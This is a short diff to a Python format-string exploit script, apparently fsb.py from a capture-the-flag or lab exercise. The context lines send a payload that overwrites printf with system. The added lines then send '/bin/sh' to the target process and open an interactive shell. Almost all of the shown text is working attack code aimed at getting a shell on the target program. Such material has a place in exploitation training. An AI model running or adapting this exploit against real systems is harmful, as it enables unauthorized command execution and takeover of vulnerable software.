@@ -128,10 +128,9 @@ uv run fsb.py
     payload = fsb_unit(addr_system, addr_printf)
     show_payload(payload)
     proc.sendafter("Input message", payload)
+    payload = b'/bin/sh'
+    proc.sendafter("Input message", payload)
     proc.interactive()
-    return
-
 
 if __name__ == "__main__":
     main()
-
